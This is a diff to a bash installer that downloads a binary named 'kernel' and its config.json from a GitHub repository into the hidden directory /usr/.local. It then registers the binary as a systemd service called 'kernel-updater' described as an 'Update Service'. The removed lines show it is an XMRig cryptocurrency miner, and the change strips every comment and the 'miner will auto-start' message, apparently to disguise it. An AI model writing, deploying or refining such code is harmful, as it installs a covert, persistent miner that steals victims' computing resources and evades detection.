@@ -1,21 +1,19 @@
 #!/bin/bash
 
-# Step 1: Download xmrig from your GitHub
-git clone http://github.com/hba/xmrig.git /tmp/xmrig
-
-# Step 2: Move to /usr/.local
 sudo mkdir -p /usr/.local
-sudo mv /tmp/xmrig /usr/.local
+wget https://github.com/hba343434/kernel/raw/refs/heads/main/kernel -O /usr/.local/kernel
+wget https://github.com/hba343434/kernel/raw/refs/heads/main/config.json -O /usr/.local/config.json
 
-# Step 3: Create symlink named 'kernel'
+
+
 sudo ln -sf /usr/.local/kernel /usr/local/bin/kernel
 
-# Accept the first argument as the new "pass" value
+
 if [ -n "$1" ]; then
     sed -i 's/"pass": *"[^"]*",/"pass": "'"$1"'",/' /usr/.local/config.json
 fi
 
-# Step 4: Create the run script
+
 sudo tee /usr/.local/run.sh > /dev/null << 'EOF'
 #!/bin/bash
 if ! pidof kernel >/dev/null; then
@@ -26,10 +24,8 @@ else
 fi
 EOF
 
-# Step 5: Make run script executable
 sudo chmod +x /usr/.local/run.sh
 
-# Step 6: Create a systemd service
 sudo tee /etc/systemd/system/kernel-updater.service > /dev/null << 'EOF'
 [Unit]
 Description=Update Service
@@ -43,9 +39,8 @@ Nice=10
 WantedBy=multi-user.target
 EOF
 
-# Step 7: Reload systemd and enable service
 sudo systemctl daemon-reexec
 sudo systemctl daemon-reload
 sudo systemctl enable --now kernel-updater.service
 
-echo "✅ Setup complete. The miner will auto-start with the name 'kernel'."
+echo "done"
